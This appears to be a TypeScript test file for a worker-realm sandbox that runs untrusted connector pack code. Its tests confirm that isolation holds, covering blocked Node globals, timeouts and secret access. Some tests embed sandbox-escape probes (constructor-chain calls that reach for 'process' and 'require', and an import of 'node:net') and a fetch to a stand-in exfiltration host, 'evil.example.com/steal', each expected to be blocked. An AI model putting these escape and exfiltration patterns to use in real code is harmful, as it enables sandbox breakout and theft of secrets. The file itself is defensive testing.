import { assert, it } from "@effect/vitest";
import { WatchConnectorError, type WatchConnectorErrorReason } from "@t3tools/contracts";
import * as Cause from "effect/Cause";
import * as Effect from "effect/Effect";
import * as Result from "effect/Result";
import * as Schema from "effect/Schema";

import * as PackModule from "./PackModule.ts";

const isConnectorError = Schema.is(WatchConnectorError);

const expectConnectorError = <A>(
  reason: WatchConnectorErrorReason,
  effect: Effect.Effect<A, PackModule.PackWorkerError>,
) =>
  effect.pipe(
    Effect.matchEffect({
      onFailure: (error) => {
        assert.isTrue(isConnectorError(error), "expected a WatchConnectorError");
        if (isConnectorError(error)) assert.equal(error.reason, reason);
        return Effect.void;
      },
      onSuccess: () => Effect.die(new Error("expected the effect to fail")),
    }),
  );

const connector = (source: string) => ({ "connector.js": source });

const ctxOf = (
  overrides?: Partial<PackModule.ConnectorModuleContext>,
): PackModule.ConnectorModuleContext => ({
  config: {},
  secrets: PackModule.makeSecretsAccessor([], {}),
  failAuthExpired: (message: string) => new PackModule.ConnectorAuthExpiredError(message),
  ...overrides,
});

it.effect("evaluates the entry module and invokes fetch/transform through the context", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: (ctx) => ({ raw: ctx.config["repo"], echoed: ctx.files["dir/a.json"] }),
        transform: (raw, ctx) => ({ repo: raw.raw, echoed: raw.echoed, key: ctx.secrets.get("apiKey") }),
      };`),
    );
    const ctx = ctxOf({
      config: { repo: "t3" },
      secrets: PackModule.makeSecretsAccessor(["apiKey"], { apiKey: "s3cr3t" }),
      files: { "dir/a.json": "{}" },
    });
    assert.isDefined(mod.fetch);
    assert.isDefined(mod.transform);
    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
    const snapshot = yield* PackModule.invokePackFunction(() => mod.transform?.(raw, ctx));
    assert.deepEqual(snapshot, { repo: "t3", echoed: "{}", key: "s3cr3t" });
  }),
);

it.effect("rejects a bundle with no connector.js entry file", () =>
  expectConnectorError(
    "packCodeInvalid",
    PackModule.evalConnectorModule({ "other.js": "module.exports = {};" }),
  ),
);

it.effect("rejects an entry that throws during evaluation", () =>
  expectConnectorError(
    "packCodeInvalid",
    PackModule.evalConnectorModule(connector(`throw new Error("boom");`)),
  ),
);

it.effect("pack code gets no ambient Node capabilities (no require/process/fetch)", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: () => ({
          hasRequire: typeof require !== "undefined",
          hasProcess: typeof process !== "undefined",
          hasFetch: typeof fetch !== "undefined",
        }),
      };`),
    );
    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctxOf()));
    assert.deepEqual(raw, { hasRequire: false, hasProcess: false, hasFetch: false });
  }),
);

it.effect("realm escapes via constructor chains land on a neutered worker realm", () =>
  Effect.gen(function* () {
    // `module`, the ctx members, and injected globals are worker-realm
    // values — `.constructor.constructor("return process")` used to compile
    // in the *host* realm and hand back the real process. Post-boundary the
    // same probe resolves in the worker realm, which has no `process`,
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: (ctx) => {
          const probe = (fn) => {
            try { return fn(); } catch (e) { return e && e.name ? e.name : String(e); }
          };
          return {
            viaModule: probe(() => module.constructor.constructor("return process")()),
            viaCtxSecrets: probe(() => ctx.secrets.get.constructor.constructor("return process")()),
            viaCtxFetch: probe(() => ctx.fetch.constructor.constructor("return this")().process),
            viaConfigCtor: probe(() => ctx.config.constructor.constructor("return require")("fs")),
            workerGlobals: probe(() => {
              const g = ctx.fetch.constructor.constructor("return this")();
              return { hasProcess: typeof g.process, hasRequire: typeof g.require, hasFetch: typeof g.fetch };
            }),
          };
        },
      };`),
    );
    const ctx = ctxOf({
      secrets: PackModule.makeSecretsAccessor(["apiKey"], { apiKey: "s3cr3t" }),
      fetch: () => Promise.resolve(new Response("{}", { status: 200 })),
    });
    const raw = (yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx))) as Record<
      string,
      unknown
    >;
    assert.equal(raw["viaModule"], "ReferenceError");
    assert.equal(raw["viaCtxSecrets"], "ReferenceError");
    assert.isUndefined(raw["viaCtxFetch"]);
    assert.equal(raw["viaConfigCtor"], "ReferenceError");
    assert.deepEqual(raw["workerGlobals"], {
      hasProcess: "undefined",
      hasRequire: "undefined",
      hasFetch: "undefined",
    });
  }),
);

it.effect("module loading is sealed inside the worker (require and import() both reject)", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: async (ctx) => {
          const results = {};
          try { results.importNet = await import("node:net") !== undefined; }
          catch (e) { results.importNet = "blocked:" + (e && e.message ? e.message : e); }
          try { results.reqNet = await ctx.fetch.constructor.constructor("return import('node:net')")(); }
          catch (e) { results.reqNet = "blocked:" + (e && e.message ? e.message : e); }
          return results;
        },
      };`),
    );
    const ctx = ctxOf({
      fetch: () => Promise.resolve(new Response("{}", { status: 200 })),
    });
    const raw = (yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx))) as Record<
      string,
      unknown
    >;
    // Inside the inner realm there is no dynamic-import callback; in the
    // worker realm the sealed loader rejects every specifier.
    assert.match(String(raw["importNet"]), /^blocked:/);
    assert.match(String(raw["reqNet"]), /^blocked:/);
  }),
);

it.live("a synchronous pack spin is killed when the invocation times out", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = { fetch: () => { while (true) {} } };`),
    );
    // Interruption terminates the worker — the spin cannot outlive the
    // deadline even though it never yields to the event loop.
    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctxOf())).pipe(
      Effect.timeout(500),
      Effect.result,
    );
    assert.isTrue(Result.isFailure(result));
    if (Result.isFailure(result)) {
      assert.isTrue(Cause.isTimeoutError(result.failure));
    }
  }),
);

it.live("module evaluation that spins is killed when the eval times out", () =>
  Effect.gen(function* () {
    const result = yield* PackModule.evalConnectorModule(connector(`while (true) {}`)).pipe(
      Effect.timeout(500),
      Effect.result,
    );
    assert.isTrue(Result.isFailure(result));
    if (Result.isFailure(result)) {
      assert.isTrue(Cause.isTimeoutError(result.failure));
    }
  }),
);

it.effect("ctx.fetch round-trips through the host egress implementation", () =>
  Effect.gen(function* () {
    const seen: Array<{
      url: string;
      method: string | undefined;
      headers: unknown;
      body: unknown;
    }> = [];
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: async (ctx) => {
          const response = await ctx.fetch("https://api.example.com/status", {
            method: "POST",
            headers: { "x-key": "v" },
            body: "payload",
          });
          return { status: response.status, ok: response.ok, body: await response.json() };
        },
        transform: (raw) => raw,
      };`),
    );
    const ctx = ctxOf({
      fetch: (input, init) => {
        seen.push({
          url: input.toString(),
          method: init?.method,
          headers: init?.headers,
          body: init?.body,
        });
        return Promise.resolve(
          new Response(JSON.stringify({ up: true }), {
            status: 201,
            headers: { "content-type": "application/json" },
          }),
        );
      },
    });
    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
    assert.deepEqual(raw, { status: 201, ok: true, body: { up: true } });
    assert.deepEqual(seen, [
      {
        url: "https://api.example.com/status",
        method: "POST",
        headers: { "x-key": "v" },
        body: "payload",
      },
    ]);
  }),
);

it.effect("a ctx.fetch rejection surfaces inside pack code with its reason intact", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: async (ctx) => {
          try {
            await ctx.fetch("https://evil.example.com/steal");
            return { reached: true };
          } catch (e) {
            return { reached: false, name: e.name, reason: e.reason, message: e.message };
          }
        },
      };`),
    );
    const ctx = ctxOf({
      fetch: () =>
        Promise.reject(
          new WatchConnectorError({
            message:
              "Connector egress to https://evil.example.com/steal is not in the pack's declared egressHosts.",
            reason: "egressBlocked",
          }),
        ),
    });
    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
    assert.deepEqual(raw, {
      reached: false,
      name: "WatchConnectorError",
      reason: "egressBlocked",
      message:
        "Connector egress to https://evil.example.com/steal is not in the pack's declared egressHosts.",
    });
  }),
);

it.effect("an uncaught connector error from ctx.fetch preserves its reason host-side", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: (ctx) => ctx.fetch("https://evil.example.com/steal"),
      };`),
    );
    const ctx = ctxOf({
      fetch: () =>
        Promise.reject(
          new WatchConnectorError({
            message: "egress denied",
            reason: "egressBlocked",
          }),
        ),
    });
    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx)).pipe(Effect.result);
    assert.isTrue(Result.isFailure(result));
    if (Result.isFailure(result)) {
      const failure = result.failure;
      assert.isTrue(Cause.isUnknownError(failure));
      if (Cause.isUnknownError(failure)) {
        assert.isTrue(isConnectorError(failure.cause));
        if (isConnectorError(failure.cause)) {
          assert.equal(failure.cause.reason, "egressBlocked");
        }
      }
    }
  }),
);

it.effect("rejects an entry exporting neither fetch nor transform", () =>
  expectConnectorError(
    "packCodeInvalid",
    PackModule.evalConnectorModule(connector(`module.exports = { notIt: 1 };`)),
  ),
);

it.effect("rejects a non-function migrateConfig export", () =>
  expectConnectorError(
    "packCodeInvalid",
    PackModule.evalConnectorModule(
      connector(`module.exports = { transform: (raw) => raw, migrateConfig: 42 };`),
    ),
  ),
);

it.effect("exposes migrateConfig for the re-pin path with the instance config on ctx", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        transform: (raw) => raw,
        migrateConfig: (from, to, ctx) => ({ from, to, repo: ctx.config["repo"], hasSecrets: typeof ctx.secrets }),
      };`),
    );
    assert.isDefined(mod.migrateConfig);
    // The service hands migrate a ctx without secrets — the accessor is
    // simply absent inside pack code.
    const ctx: PackModule.ConnectorModuleContext = {
      config: { repo: "t3" },
      failAuthExpired: (message: string) => new PackModule.ConnectorAuthExpiredError(message),
    };
    const migrated = yield* PackModule.invokePackFunction(() => mod.migrateConfig?.(1, 2, ctx));
    assert.deepEqual(migrated, { from: 1, to: 2, repo: "t3", hasSecrets: "undefined" });
  }),
);

it.effect("declared secrets resolve inside pack code; undeclared keys throw", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: (ctx) => {
          const probe = {};
          probe.declared = ctx.secrets.get("apiKey");
          probe.sparse = ctx.secrets.get("other");
          try { probe.undeclared = ctx.secrets.get("adminToken"); }
          catch (e) { probe.undeclared = e.name; }
          return probe;
        },
      };`),
    );
    const ctx = ctxOf({
      secrets: PackModule.makeSecretsAccessor(["apiKey", "other"], { apiKey: "s3cr3t" }),
    });
    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
    assert.deepEqual(raw, {
      declared: "s3cr3t",
      sparse: undefined,
      undeclared: "ConnectorSecretAccessError",
    });
  }),
);

it("declared secret keys resolve; undeclared keys throw before any lookup", () => {
  const secrets = PackModule.makeSecretsAccessor(["apiKey"], { apiKey: "s3cr3t" });
  assert.equal(secrets.get("apiKey"), "s3cr3t");
  // Declared but not configured resolves to undefined — not an error.
  const sparse = PackModule.makeSecretsAccessor(["apiKey", "other"], { apiKey: "s3cr3t" });
  assert.isUndefined(sparse.get("other"));
  let thrown: unknown;
  try {
    secrets.get("adminToken");
  } catch (error) {
    thrown = error;
  }
  assert.instanceOf(thrown, PackModule.ConnectorSecretAccessError);
});

it.effect("auth-expired thrown by pack code unwraps out of UnknownError", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: (ctx) => { throw ctx.failAuthExpired("upstream returned 401"); },
      };`),
    );
    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctxOf())).pipe(
      Effect.result,
    );
    assert.isTrue(Result.isFailure(result));
    if (Result.isFailure(result)) {
      const failure = result.failure;
      assert.isTrue(Cause.isUnknownError(failure));
      if (Cause.isUnknownError(failure)) {
        assert.instanceOf(failure.cause, PackModule.ConnectorAuthExpiredError);
      }
    }
  }),
);

it.effect("an undeclared secret access surfaces as the typed marker host-side", () =>
  Effect.gen(function* () {
    const mod = yield* PackModule.evalConnectorModule(
      connector(`module.exports = {
        fetch: (ctx) => ctx.secrets.get("adminToken"),
      };`),
    );
    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctxOf())).pipe(
      Effect.result,
    );
    assert.isTrue(Result.isFailure(result));
    if (Result.isFailure(result)) {
      const failure = result.failure;
      assert.isTrue(Cause.isUnknownError(failure));
      if (Cause.isUnknownError(failure)) {
        assert.instanceOf(failure.cause, PackModule.ConnectorSecretAccessError);
      }
    }
  }),
);

it.effect("rejects oversized transform output with a typed error — never truncates", () =>
  Effect.gen(function* () {
    const oversized = { data: "x".repeat(PackModule.MAX_SNAPSHOT_BYTES) };
    yield* expectConnectorError("snapshotTooLarge", PackModule.serializeSnapshot(oversized));
    // Just under the cap still serializes whole.
    const fits = { data: "x".repeat(64) };
    const json = yield* PackModule.serializeSnapshot(fits);
    assert.equal(json, encodeJsonCheck(fits));
  }),
);

const encodeJsonCheck = Schema.encodeSync(Schema.fromJsonString(Schema.Unknown));
